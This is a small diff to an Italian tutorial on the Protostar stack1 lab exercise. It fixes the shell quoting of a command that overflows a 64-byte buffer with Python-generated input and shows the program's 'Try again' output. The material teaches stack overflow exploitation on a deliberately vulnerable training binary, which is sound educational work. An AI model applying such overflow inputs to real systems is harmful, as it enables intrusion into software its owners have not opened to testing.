@@ -17,7 +17,7 @@ Riempire _buffer_ con 64 caratteri e alla fine appendere i 4 corrispondenti a 0x
 ## Come sfruttare le vulnerabilità
 Proviamo ad eseguire
 ```bash
-> /opt/protostar/bin/stack1 'python –c 'print "a" * 64 + "abcd"'' 
+> /opt/protostar/bin/stack1 $(python –c 'print "a" * 64 + "abcd"') 
 # stampa errore
 Try again, you got 0x64636261
 ```
